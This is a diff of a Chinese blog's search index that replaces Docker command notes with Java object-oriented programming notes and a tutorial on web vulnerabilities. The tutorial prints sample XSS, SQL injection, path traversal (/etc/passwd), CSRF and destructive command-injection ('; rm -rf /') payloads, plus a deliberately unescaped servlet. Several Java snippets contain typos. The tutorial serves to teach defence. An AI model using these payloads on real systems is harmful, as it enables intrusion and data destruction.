class="line">#将文件拷贝出来到主机上</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker cp 69687a39e545:/home/test.java /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  test.java  www</span><br><span class="line"></span><br><span class="line">#拷贝是一个手动过程，使用-v卷的技术可以实现</span><br></pre></td></tr></table></figure>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230730205339571.png" alt="image-20230730205339571"></p>
+<h1 id="Java-对象和类"><a href="#Java-对象和类" class="headerlink" title="Java 对象和类"></a>Java 对象和类</h1><ul>
+<li><p><strong>类和对象的关系</strong><br><strong>类</strong>:类是对现实生活中一类具有共同属性和行为的事物的抽象<br><strong>对象</strong>:是能够看得到摸的着的真实存在的实体</p>
+</li>
+<li><p><strong>类的定义</strong><br><strong>类的重要性</strong>:是Java程序的基本组成单位<br><strong>类是什么</strong>:是对现实生活中一类具有共同属性和行为的事物的抽象，确定对象将会拥有的属性和行为</p>
+<p><strong>类的特点</strong>：类是对象的数据类型，是具有相同属性和行为的事物的抽象</p>
+<p><strong>类的组成</strong>:属性和行为<br><strong>属性</strong>:在类中通过成员变量来体现(类中方法外的变量)<br><strong>行为</strong>:在类中通过成员方法来体现(和前面的方法相比去掉static关键字即可)</p>
+</li>
+<li><p><strong>对象的定义</strong></p>
+<p>看看周围真实的世界，会发现身边有很多对象，车，手机，人等等。所有这些对象都有自己的属性和行为。</p>
+</li>
+</ul>
+<p>​       拿一个手机来举例，它的属性有：品牌、价格，行为有：打电话、发短信。</p>
+<p>​       软件对象也有属性和行为。行为通过方法体现。</p>
+<p>​       在软件开发中，方法操作对象内部状态的改变，对象的相互调用也是通过方法来完成。</p>
+<h2 id="Java-中的类"><a href="#Java-中的类" class="headerlink" title="Java 中的类"></a>Java 中的类</h2><p>类可以看成是创建 Java 对象的模板。</p>
+<p>pubIic class Phone {</p>
+<p>​		&#x2F;&#x2F;成员变量</p>
+<p>​		String brand;</p>
+<p>​		int price;</p>
+<p>​		&#x2F;&#x2F;成员方法</p>
+<p>​		public void call(){</p>
+<p>​			System.out.printIn(“打电话”);}<br>​		public void sendMessage(){</p>
+<p>​			System.out,pnintIn(“发短信”);}</p>
+<p>}</p>
+<p><strong>成员变量和局部变量的区别</strong></p>
 <table>
 <thead>
 <tr>
-<th align="center">attach</th>
-<th align="center">Attach to a running container</th>
-<th align="center">当前 she11 下 attach 连接指定运行镜像</th>
+<th align="center">区别</th>
+<th align="center">成员变量</th>
+<th align="center">局部变量</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">build</td>
-<td align="center">Build an imagerfrom a Dockerfile</td>
-<td align="center">通过 Dockerfile 定制镜像</td>
+<td align="center">类中位置不同</td>
+<td align="center">类中方法外</td>
+<td align="center">方法内或者方法声明上</td>
 </tr>
 <tr>
-<td align="center">commit</td>
-<td align="center">Create a new image from a container changes</td>
-<td align="center">提交当前容器为新的镜像</td>
+<td align="center">内存中位置不同</td>
+<td align="center">堆内存</td>
+<td align="center">栈内存</td>
 </tr>
 <tr>
-<td align="center">cp</td>
-<td align="center">Copy files&#x2F;folders from the containers filesystem to the host path</td>
-<td align="center">从容器中搏贝指定文件或者目录到宿主机中</td>
+<td align="center">生命周期不同</td>
+<td align="center">随着对象的存在而存在，随看对象的消失而消失</td>
+<td align="center">随着方法的调用而存在，随着方法的调用完毕而消失</td>
 </tr>
 <tr>
-<td align="center">create</td>
-<td align="center">Create a new container</td>
-<td align="center">创建一个新的容器，同 run，但不启动容器</td>
-</tr>
-<tr>
-<td align="center">diff</td>
-<td align="center">Inspect changes on a container’s fiesystem</td>
-<td align="center">查看 docker 容器变化</td>
-</tr>
-<tr>
-<td align="center">events</td>
-<td align="center">Get real time events from the server</td>
-<td align="center">从 docker 服务获取容器实时事件</td>
-</tr>
-<tr>
-<td align="center">exec</td>
-<td align="center">Run a command in an existing container</td>
-<td align="center">在已存在的容器上运行命令</td>
-</tr>
-<tr>
-<td align="center">export</td>
-<td align="center">Stream the contents of a container as a tar archive</td>
-<td align="center">导出容器的内容作为一个 tar 归档文件[对应import]</td>
-</tr>
-<tr>
-<td align="center">history</td>
-<td align="center">Show the history of an image</td>
-<td align="center">展示一个镜像形成历史</td>
-</tr>
-<tr>
-<td align="center">images</td>
-<td align="center">List images</td>
-<td align="center">列出系统当前镜像</td>
-</tr>
-<tr>
-<td align="center">import</td>
-<td align="center">Create a new filesystem image from the contents of a tarball</td>
-<td align="center">从tar包中的内容创建一个新的文件系统映像[对应export]</td>
-</tr>
-<tr>
-<td align="center">info</td>
-<td align="center">Display system-wide information</td>
-<td align="center">显示系统相关信息</td>
-</tr>
-<tr>
-<td align="center">inspect</td>
-<td align="center">Return low-Tevel information on a container</td>
-<td align="center">查看容器详细信息</td>
-</tr>
-<tr>
-<td align="center">kill</td>
-<td align="center">Kill a running container</td>
-<td align="center">kill 指定 docker 容器</td>
-</tr>
-<tr>
-<td align="center">load</td>
-<td align="center">Load an image from a tar archive</td>
-<td align="center">从一个 tar 包中加载一个像[对应 save]</td>
-</tr>
-<tr>
-<td align="center">login</td>
-<td align="center">Register or Login to the docker registry server</td>
-<td align="center">注册或者陆一个 docker 源服务器</td>
-</tr>
-<tr>
-<td align="center">logout</td>
-<td align="center">Log out from a Docker registry server</td>
-<td align="center">从当前 Docker registry 退出</td>
-</tr>
-<tr>
-<td align="center">logs</td>
-<td align="center">Fetch the logs of a container</td>
-<td align="center">输出当前容器日志信息</td>
-</tr>
-<tr>
-<td align="center">port</td>
-<td align="center">Lookup the public-facing port which is NAT-ed to PRIVATE_PORT</td>
-<td align="center">查看映射端口对应的容器内部源端口</td>
-</tr>
-<tr>
-<td align="center">pause</td>
-<td align="center">Pause all processes within a container</td>
-<td align="center">暂停容器</td>
-</tr>
-<tr>
-<td align="center">ps</td>
-<td align="center">List containers</td>
-<td align="center">列出容器列表</td>
-</tr>
-<tr>
-<td align="center">pull</td>
-<td align="center">Pull an image or a repository from the docker registry server</td>
-<td align="center">从docker镜像源服务器拉取指定镜像或者库镜像</td>
-</tr>
-<tr>
-<td align="center">push</td>
-<td align="center">Push an image or a repository to the docker registry server</td>
-<td align="center">推送指定镜像或者库镜像至docker源服务器</td>
-</tr>
-<tr>
-<td align="center">restart</td>
-<td align="center">Restart a running container</td>
-<td align="center">重启运行的容器</td>
-</tr>
-<tr>
-<td align="center">rm</td>
-<td align="center">Remove one or more containers</td>
-<td align="center">移除一个或者多个容器</td>
-</tr>
-<tr>
-<td align="center">rmi</td>
-<td align="center">Remove one or more images</td>
-<td align="center">移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</td>
-</tr>
-<tr>
-<td align="center">run</td>
-<td align="center">Run a command in a new container</td>
-<td align="center">创建一个新的容器并运行一个命令</td>
-</tr>
-<tr>
-<td align="center">save</td>
-<td align="center">Save an image to a tar archive</td>
-<td align="center">保存一个镜像为一个 tar 包[对应 load]</td>
-</tr>
-<tr>
-<td align="center">search</td>
-<td align="center">Search for an image on the Docker Hub</td>
-<td align="center">在 docker hub 中搜索镜像</td>
-</tr>
-<tr>
-<td align="center">start</td>
-<td align="center">Start a stopped containers</td>
-<td align="center">启动容器</td>
-</tr>
-<tr>
-<td align="center">stop</td>
-<td align="center">Stop a running containers</td>
-<td align="center">停止容器</td>
-</tr>
-<tr>
-<td align="center">tag</td>
-<td align="center">Tag an image into a repository</td>
-<td align="center">给源中镜像打标签</td>
-</tr>
-<tr>
-<td align="center">top</td>
-<td align="center">Lookup the running processes of a container</td>
-<td align="center">查看容器中运行的进程信息</td>
-</tr>
-<tr>
-<td align="center">unpause</td>
-<td align="center">Unpause a paused container</td>
-<td align="center">取消暂停容器</td>
-</tr>
-<tr>
-<td align="center">version</td>
-<td align="center">Show the docker version information</td>
-<td align="center">查看 docker 版本号</td>
-</tr>
-<tr>
-<td align="center">wait</td>
-<td align="center">Block until a container stops，then print its exit code</td>
-<td align="center">截取容器止时的退出状态值</td>
+<td align="center">初始化值不同</td>
+<td align="center">有默认的初始化值</td>
+<td align="center">没有默认的初始化值，必须先定义，赋值，才能使用</td>
 </tr>
 </tbody></table>
+<ul>
+<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
+<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
+<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
+</ul>
+<hr>
+<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>格式:类名对象名 &#x3D; new 类名0;<br>范例: Phone p &#x3D; new Phone0;</p>
+<h2 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h2><ol>
+<li><strong>使用成员变量</strong><br>格式:对象名.变量名<br>范例:p.brand</li>
+<li><strong>使用成员方法</strong><br>格式:对象名.方法名()<br>范例: p.call()</li>
+</ol>
+<hr>
+<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="一、private关键字"><a href="#一、private关键字" class="headerlink" title="一、private关键字"></a>一、private关键字</h2><ul>
+<li>是一个权限修饰符</li>
+<li>可以修饰成员 (成员变量和成员方法)</li>
+<li>作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能访问</li>
+</ul>
+<p>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作</p>
+<ul>
+<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>
+<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>
+</ul>
+<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><ol>
+<li><p>this修饰的变量用于指代成员变量<br>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量<br>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</p>
+</li>
+<li><p>什么时候使用this呢? <strong>解决局部变量隐藏成员变量</strong></p>
+</li>
+<li><p>this 代表所在类的对象引用<br>记住:方法被哪个对象调用，this就代表哪个对象</p>
+</li>
+</ol>
+<h2 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h2><ol>
+<li><strong>封装概述</strong><br>是面向对象三大特征之一 (封装，继承，多态)<br>是面向对象编程语言对客观世界的横拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作</li>
+<li><strong>封装规则</strong><br>将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对的冠信息的操作和访问成员变量private，提供对应的getXxx()&#x2F;setXxx()方法</li>
+<li><strong>好处</strong><br>通过方法来控制成员变量的操作，提高了代码的安全性<br>把代码用方法进行封装，提高了代码的复用性</li>
+</ol>
+<h2 id="四、构造方法"><a href="#四、构造方法" class="headerlink" title="四、构造方法"></a>四、构造方法</h2><p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。</p>
+<p>下面是一个构造方法示例：</p>
+<p>public class Student{   </p>
+<p>​		 public Student(){ }     </p>
+<p>​		 public Student(String name){         </p>
+<p>​			&#x2F;&#x2F; 这个构造器仅有一个参数：name    } }</p>
+<p><strong>注意事项</strong>：</p>
+<ol>
+<li><p>构造方法的创建</p>
+<p>如果没有定义构造方法，系统将给出一个认的无参数构造方法<br>如果定义了构造方法，系统将不再提供默认的构造方法</p>
+</li>
+<li><p>构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p>
+</li>
+<li><p>推荐的使用方式<br>无论是否使用，都手工书写无参数构造方法</p>
+</li>
+</ol>
+<h5 id="标准类制作"><a href="#标准类制作" class="headerlink" title="标准类制作"></a>标准类制作</h5><ol>
+<li>成员变量<br>使用private修饰</li>
+<li>构造方法<br>提供一个无参构造方法<br>提供一个带多个参数的构造方法</li>
+<li>成员方法<br>提供每一个成员变量对应的setXxx()&#x2F;getXxx()<br>提供一个显示对象信息的show()</li>
+<li>创建对象并为其成员变量值的两种方式<br>无参构造方法创建对象后使用setXxx()赋值<br>使用带参构造方法直接创建带有属性值的对象</li>
+</ol>
+<p>例子：</p>
+<h5 id="Student-java程序"><a href="#Student-java程序" class="headerlink" title="Student.java程序"></a>Student.java程序</h5><p>public class Student{   </p>
+<p>​		prative String name;&#x2F;&#x2F;成员变量</p>
+<p>​		prative int age;</p>
+<p>​		public Student() { }&#x2F;&#x2F;构造方法</p>
+<p>​		public Student(String name,int age){ </p>
+<p>​			this.name &#x3D; name;</p>
+<p>​			this.age &#x3D; age;}</p>
+<p>​		&#x2F;&#x2F;成员方法</p>
+<p>​		public void setName(String name){</p>
+<p>​			this.name &#x3D; name;}</p>
+<p>​		public String getName(){</p>
+<p>​			return name;}</p>
+<p>​		public void setAge(int age){</p>
+<p>​			this.age &#x3D; age;}</p>
+<p>​		public String getAge(){</p>
+<p>​			return age;}</p>
+<p>​		public void show(){</p>
+<p>​			System.out.println(name+”,”+age);}</p>
+<p>} </p>
+<h5 id="StudentDemo-java程序"><a href="#StudentDemo-java程序" class="headerlink" title="StudentDemo.java程序"></a>StudentDemo.java程序</h5><p>package com.XXX</p>
+<p>public class StudentDemo{</p>
+<p>​		public static void main(String[ ] args){</p>
+<p>​			&#x2F;&#x2F;无参构造方法创建对象后使用setXxx()赋值</p>
+<p>​			Student s1 &#x3D; new Student( );</p>
+<p>​			s1.setName(“xuan”);</p>
+<p>​			s1.setAge(18);</p>
+<p>​			s1.show();</p>
+<p>​			&#x2F;&#x2F;使用带参构造方法直接创建带有属性值的对象</p>
+<p>​			Student s2 &#x3D; new Student(“name:”xuan”,age:18);</p>
+<p>​			s2.show();</p>
+<p>​		}		</p>
+<p>}</p>
+<p><strong>运行结果</strong>：</p>
+<p>xuan,18</p>
+<p>xuan,18</p>
+<h1 id="Java-继承"><a href="#Java-继承" class="headerlink" title="Java 继承"></a>Java 继承</h1><hr>
+<h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承是面向对象的三大特征之一，可以使得子类具有父类的属性和方法，还可以在子类中重新定义，追加属性和方法</p>
+<ul>
+<li>格式:public class 子类名extends父类名}</li>
+<li>范例: public class Zi extends Fu<br>Fu:是类，也被称为基类、超类<br>Zi: 是子类，也被称为派生类</li>
+</ul>
+<p>继承中子类的特点：</p>
+<p>子类可以有父类的内容，还可以有自己特有的内容</p>
+<h2 id="继承的好处和弊端"><a href="#继承的好处和弊端" class="headerlink" title="继承的好处和弊端"></a>继承的好处和弊端</h2><p><strong>继承好处</strong><br>提高了代码的复用性(多个类相同的成员可以放到同一个类中)<br>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)<br><strong>继承弊端</strong><br>继承让类与类之间产生了关系，类的合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性<br><strong>什么时候使用继承?</strong><br>继承体现的关系:is a<br>假设法:我有两个类A和B，如果他们满足A是B的一种，或者B是A的一种，就说明他们存在继承关系，这个时候就可以考虑使用继承来体现，否则就不滥用继承</p>
+<h2 id="继承中变量的访问特点"><a href="#继承中变量的访问特点" class="headerlink" title="继承中变量的访问特点"></a>继承中变量的访问特点</h2><p>在子类方法中访问一个变量</p>
+<ol>
+<li>子类局部范围找</li>
+<li>子类成员范围找</li>
+<li>父类成员范围找</li>
+<li>如果都没有就报错(不考虑父亲的父亲…)</li>
+</ol>
+<h2 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h2><p>需要注意的是 Java 不支持多继承，但支持多重继承。</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2013/12/java-extends-2020-12-08.png" alt="img"></p>
+<h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>
+<h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>
+<p>public class Animal {<br>    private String name;<br>    private int id;<br>    public Animal(String myName, int myid) {<br>        &#x2F;&#x2F;初始化属性值<br>    }<br>    public void eat() {  &#x2F;&#x2F;吃东西方法的具体实现  }<br>    public void sleep() { &#x2F;&#x2F;睡觉方法的具体实现  }<br>} </p>
+<p>public class Penguin  extends  Animal{<br>}</p>
+<h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有<code>多继承</code>的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>
+<p>public interface A {<br>    public void eat();<br>    public void sleep();<br>}</p>
+<p>public interface B {<br>    public void show();<br>}</p>
+<p>public class C implements A,B {<br>}</p>
+<h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p>super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>
+<p>this关键字：指向自己的引用。</p>
+<p><strong>实例</strong></p>
+<p>class Animal {<br>  void eat() {<br>    System.out.println(“animal : eat”);<br>  }<br>}</p>
+<p>class Dog extends Animal {<br>  void eat() {<br>    System.out.println(“dog : eat”);<br>  }<br>  void eatTest() {<br>    this.eat();   &#x2F;&#x2F; this 调用自己的方法<br>    super.eat();  &#x2F;&#x2F; super 调用父类方法<br>  }<br>}</p>
+<p>public class Test {<br>  public static void main(String[] args) {<br>    Animal a &#x3D; new Animal();<br>    a.eat();<br>    Dog d &#x3D; new Dog();<br>    d.eatTest();<br>  }<br>}</p>
+<p>输出结果为：</p>
+<p>animal : eat<br>dog : eat<br>animal : eat</p>
+<h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。</p>
+<p><strong>final修饰的特点</strong></p>
+<ul>
+<li>修饰方法:表明该方法是最终方法，不能被重写</li>
+<li>修饰变量:表明该变量是常量，不能再次被赋值</li>
+<li>修饰类:表明该类是最终类，不能被继承</li>
+</ul>
+<p>声明类：</p>
+<p>final class 类名 {&#x2F;&#x2F;类体}</p>
+<p>声明方法：</p>
+<p>修饰符(public&#x2F;private&#x2F;default&#x2F;protected) final 返回值类型 方法名(){&#x2F;&#x2F;方法体}</p>
+<p><strong>注：</strong> final 定义的类，其中的属性、方法不是 final 的。</p>
+<p><strong>final修饰局部变量</strong></p>
+<p>变量是基本类型: final修饰指的是基本类型的数据值不能发生改变</p>
+<p>变量是引用类型: final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</p>
+<h1 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h1><p>static 关键字是静态的意思，可以修饰成员方法，成员变量<br><strong>static 修饰的特点</strong></p>
+<ul>
+<li>被类的所有对象共享<br>这也是我们判断是否使用静态关键字的条件</li>
+<li>推荐使用类名调用</li>
+</ul>
+<p><strong>static 访问特点</strong></p>
+<p>静态成员方法只能访问静态成员和静态成员方法</p>
+<h1 id="Java-包"><a href="#Java-包" class="headerlink" title="Java 包"></a>Java 包</h1><p>包主要用来对类和接口进行分类管理</p>
+<p>包的定义格式</p>
+<p>格式：package 包名；</p>
+<p>范例：package com.first;</p>
+<h2 id="import-语句-导包"><a href="#import-语句-导包" class="headerlink" title="import 语句(导包)"></a>import 语句(导包)</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p>
+<p>例如，下面的命令行将会命令编译器载入 java_installation&#x2F;java&#x2F;io 路径下的所有类</p>
+<p>import java.io.*;(import 包名)</p>
 ]]></content>
       <tags>
-        <tag>Docker</tag>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java漏洞</title>
+    <url>/2023/08/26/Java%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="一、跨站脚本（Cross-Site-Scripting，XSS）"><a href="#一、跨站脚本（Cross-Site-Scripting，XSS）" class="headerlink" title="一、跨站脚本（Cross-Site Scripting，XSS）"></a>一、跨站脚本（Cross-Site Scripting，XSS）</h1><p>是一种常见的Web安全漏洞，攻击者通过注入恶意代码到网页中，使得这些代码被其他用户的浏览器执行，从而攻击用户的计算机系统.<br><strong>XSS攻击通常分为以下几类：</strong></p>
+<ul>
+<li><p>反射型XSS：攻击者构造一个恶意的URL，将恶意代码注入到URL中，诱使用户点击该URL，从而触发攻击。</p>
+</li>
+<li><p>存储型XSS：攻击者将恶意代码存储在服务器上的数据库中，当其他用户访问相应的页面时，这些代码会被读取并执行，从而攻击用户。</p>
+</li>
+<li><p>DOM-based XSS：攻击者通过修改浏览器中的DOM树，将恶意代码注入到网页中，诱使用户执行恶意代码。</p>
+</li>
+</ul>
+<p>当Java程序扫描到跨站脚本漏洞时，通常会给出一些具体的提示信息，比如漏洞出现的位置、攻击者可以注入的代码类型等等。一般来说，修复跨站脚本漏洞需要在应用程序的代码中加入一些安全措施，如输入验证、输出过滤等，以防止攻击者注入恶意代码。<br><strong>跨站脚本示例：</strong></p>
+<p>示例一：</p>
+<p>假设有一个搜索页面，用户在该页面输入一个关键词，然后该关键词将被发送到服务器进行搜索，最后将搜索结果返回给用户。</p>
+<p>如果程序没有对用户输入的关键词进行过滤，攻击者就可以在搜索框中输入一段恶意的脚本代码，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当其他用户访问该页面并搜索该关键词时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
+<p>为了避免这种攻击，程序应该对用户输入的关键词进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，可以使用一些Web开发框架提供的安全函数来实现这一点，如在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤。</p>
+<p>示例二</p>
+<p>假设有一个Java Web应用程序，其中一个Servlet接收一个名为”message”的参数，并将其显示在页面上。代码如下：</p>
+<pre><code>@WebServlet(&quot;/xss&quot;)
+public class XssServlet extends HttpServlet &#123;
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
+        String message = request.getParameter(&quot;message&quot;);
+        response.setContentType(&quot;text/html&quot;);
+        PrintWriter out = response.getWriter();
+        out.println(&quot;&lt;html&gt;&quot;);
+        out.println(&quot;&lt;head&gt;&quot;);
+        out.println(&quot;&lt;title&gt;XSS漏洞示例&lt;/title&gt;&quot;);
+        out.println(&quot;&lt;/head&gt;&quot;);
+        out.println(&quot;&lt;body&gt;&quot;);
+        out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;);
+        out.println(&quot;&lt;/body&gt;&quot;);
+        out.println(&quot;&lt;/html&gt;&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>如果程序没有对用户输入的”message”参数进行过滤和转义，攻击者就可以在URL中注入恶意代码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/xss?message=&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当其他用户访问该URL时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
+<p>为了避免这种攻击，程序应该对用户输入的参数进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤，以确保用户输入的数据不会包含任何恶意的脚本。</p>
+<h1 id="二、SQL注入（SQL-Injection）漏洞"><a href="#二、SQL注入（SQL-Injection）漏洞" class="headerlink" title="二、SQL注入（SQL Injection）漏洞"></a>二、SQL注入（SQL Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意SQL语句来获取敏感信息，修改数据或者执行任意代码。<br><strong>SQL注入漏洞示例</strong></p>
+<p>假设一个Web应用程序中有一个搜索功能，用户可以通过输入关键字搜索相关内容。如果程序没有对用户输入的关键字进行过滤，攻击者就可以在搜索框中注入恶意的SQL语句，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR 1=1; --</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将会被拼接到SQL查询语句中，并使查询语句变为：</p>
+<pre><code>SELECT * FROM articles WHERE title=&#39;&#39; OR 1=1; -- &#39;
+</code></pre>
+<p>攻击者就可以绕过身份验证，获取文章列表中所有文章的信息</p>
+<h1 id="三、文件包含（File-Inclusion）漏洞"><a href="#三、文件包含（File-Inclusion）漏洞" class="headerlink" title="三、文件包含（File Inclusion）漏洞"></a>三、文件包含（File Inclusion）漏洞</h1><p>攻击者利用Web应用程序中存在的文件包含漏洞，向应用程序中注入恶意代码，以获取敏感信息或者执行任意代码。<br><strong>文件包含漏洞示例</strong></p>
+<p>假设一个Web应用程序中有一个功能，允许用户在服务器上查看指定的文件。如果程序没有对用户输入的文件名进行过滤，攻击者就可以通过在URL中注入恶意的文件名来读取任意文件，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/viewfile.php?file=../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将会被拼接到文件路径中，并使程序读取&#x2F;etc&#x2F;passwd文件并将其显示在页面上，攻击者就可以获取敏感信息</p>
+<h1 id="四、CSRF（Cross-Site-Request-Forgery）漏洞"><a href="#四、CSRF（Cross-Site-Request-Forgery）漏洞" class="headerlink" title="四、CSRF（Cross-Site Request Forgery）漏洞"></a>四、CSRF（Cross-Site Request Forgery）漏洞</h1><p>攻击者通过欺骗用户在已经登录的Web应用程序中执行某些操作，从而窃取用户的身份验证信息或者执行任意操作。<br><strong>CSRF漏洞示例</strong></p>
+<p>假设一个Web应用程序中有一个功能，允许用户通过访问URL来删除自己的帖子。如果程序没有进行CSRF防护，攻击者就可以伪造一个带有删除帖子的请求的页面，欺骗用户点击链接，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://example.com/deletepost.php?postid=123&amp;action=delete&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当用户点击该链接时，程序将会执行删除操作，攻击者就可以删除用户的帖子。</p>
+<h1 id="五、认证与授权漏洞"><a href="#五、认证与授权漏洞" class="headerlink" title="五、认证与授权漏洞"></a>五、认证与授权漏洞</h1><p>攻击者通过欺骗或者绕过Web应用程序的身份验证或者授权机制，获取未授权的访问权限或者执行任意操作。</p>
+<p>认证与授权漏洞示例<br>假设一个Web应用程序中的一个页面需要特定的权限才能访问，例如管理员权限。如果程序没有进行足够的身份验证或者授权机制，攻击者就可以绕过该机制，获取管理员权限并执行任意操作。</p>
+<h1 id="六、逻辑漏洞"><a href="#六、逻辑漏洞" class="headerlink" title="六、逻辑漏洞"></a>六、逻辑漏洞</h1><p>攻击者利用Web应用程序中的逻辑漏洞，绕过应用程序的安全措施，获取未授权的访问权限或者执行任意操作。</p>
+<p>逻辑漏洞示例<br>假设一个Web应用程序中的一个功能需要进行支付，用户需要在完成支付后才能获得相应的商品或者服务。如果程序存在逻辑漏洞，例如没有对支付进行验证或者没有对用户状态进行检查，攻击者就可以绕过支付流程，获得相应的商品或者服务，而不需要真正支付<br>七、敏感数据泄露漏洞</p>
+<p>Web应用程序在处理敏感信息时出现漏洞，导致敏感信息泄露。</p>
+<p>敏感数据泄露漏洞示例<br>假设一个Web应用程序中存储了用户的敏感信息，例如信用卡号、社保号码等等。如果程序没有对这些信息进行足够的保护，攻击者就可以通过利用程序的漏洞或者直接攻击数据库等方式获取这些信息。</p>
+<h1 id="八、命令注入（Command-Injection）漏洞"><a href="#八、命令注入（Command-Injection）漏洞" class="headerlink" title="八、命令注入（Command Injection）漏洞"></a>八、命令注入（Command Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意命令，从而获取敏感信息或者执行任意代码.</p>
+<p>命令注入漏洞示例<br>假设一个Web应用程序中有一个命令行操作的功能，例如允许管理员执行一些命令来管理服务器。如果程序没有对用户输入的命令进行过滤，攻击者就可以在命令中注入恶意的代码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; rm -rf /</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将会被拼接到命令中，并使命令变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls; rm -rf /</span><br></pre></td></tr></table></figure>
+
+<p>攻击者就可以执行任意代码，删除服务器上的所有文件。</p>
+<p>需要注意的是，以上示例仅仅是每个漏洞类型的一个简单示例，实际的漏洞可能会更加复杂，攻击者也会不断地创造新的攻击方式来绕过应用程序的防御措施。为了确保Web应用程序的安全性，需要开发人员注重代码的安全性，以及定期进行安全测试和漏洞扫描</p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -2841,226 +3143,6 @@ public class demo7777 &#123;
       </tags>
   </entry>
